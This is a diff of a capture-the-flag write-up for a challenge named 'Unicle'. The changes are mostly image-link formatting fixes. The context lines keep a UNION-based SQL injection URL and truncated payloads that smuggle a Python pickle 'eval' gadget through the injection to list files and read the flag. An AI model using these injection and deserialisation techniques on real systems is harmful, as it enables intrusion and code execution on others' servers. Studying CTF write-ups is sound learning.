@@ -6,8 +6,7 @@ OSaaS is the new trend for 2016! Store your object directly in the cloud. Get ri
 
 http://54.84.124.93/
 
-![Unicle application]
-(unicle01.png)
+![Unicle application](unicle01.png)
 
 ## Solution
 
@@ -29,8 +28,7 @@ After some attempts to read eg. MySQL version via _version()_ I've realized that
 http://54.84.124.93/?cat=2+union+select+1,2,%22aaa%22,4/**/
 ```
 
-![SQLi]
-(unicle02.png)
+![SQLi](unicle02.png)
 
 That was something new for me, so I've tried some other payloads:
 
@@ -99,8 +97,7 @@ http://54.84.124.93/?cat=1+and+1=2+union+select+1,2,%22c__builtin__%0Aeval%0A%28
 
 And a result in Burp Repeater:
 
-![ls -l result]
-(unicle04.png)
+![ls -l result](unicle04.png)
 
 
 So there's a _flag_ file directly in _/var/www_ directory, so let's get it!
@@ -114,8 +111,7 @@ http://54.84.124.93/?cat=1+and+1=2+union+select+1,2,%22c__builtin__%0Aeval%0A%28
 And the flag is:
 
 
-![flag]
-(unicle_flag.png)
+![flag](unicle_flag.png)
 
 ## Summary
 
@@ -134,4 +130,3 @@ Flask
 http://flask.pocoo.org/
 
 SQLAlchemy		
-http://flask-sqlalchemy.pocoo.org/2.1/
